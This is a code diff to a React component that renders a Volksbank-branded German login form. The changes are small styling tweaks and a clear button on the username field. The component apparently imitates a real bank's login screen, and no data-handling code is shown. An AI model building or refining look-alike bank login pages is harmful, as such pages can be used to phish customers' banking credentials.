@@ -1,4 +1,5 @@
 import { useState } from "react";
+import { X } from "lucide-react";
 import volksbankLogo from "@/assets/volksbank-logo.png";
 import volksbankBg from "@/assets/volksbank-bg.png";
 
@@ -43,7 +44,7 @@ const Volksbank = () => {
 
             {/* Label row */}
             <div className="flex items-center justify-between">
-              <span className="font-semibold text-sm" style={{ color: "#999" }}>
+              <span className="font-semibold text-xs" style={{ color: "#999" }}>
                 Anmeldung mit Benutzername
               </span>
               <span className="text-sm space-x-2">
@@ -58,17 +59,28 @@ const Volksbank = () => {
             </div>
 
             {/* Username input */}
-            <input
-              type="text"
-              value={username}
-              onChange={(e) => setUsername(e.target.value)}
-              className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors focus:ring-2 focus:ring-[#196bc1] focus:border-[#196bc1] focus:bg-[#f0f5ff]"
-              style={{
-                backgroundColor: "#e8e8e8",
-                borderColor: "#999",
-              }}
-              placeholder=""
-            />
+            <div className="relative">
+              <input
+                type="text"
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
+                className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors focus:ring-1 focus:ring-[#196bc1] focus:border-[#196bc1] focus:bg-[#d6e5f4]"
+                style={{
+                  backgroundColor: "#e8e8e8",
+                  borderColor: "#999",
+                }}
+                placeholder=""
+              />
+              {username && (
+                <button
+                  onClick={() => setUsername("")}
+                  className="absolute right-2 top-1/2 -translate-y-1/2"
+                  type="button"
+                >
+                  <X size={18} color="#196bc1" />
+                </button>
+              )}
+            </div>
 
             {/* Terms text */}
             <p className="text-sm" style={{ color: "#333" }}>
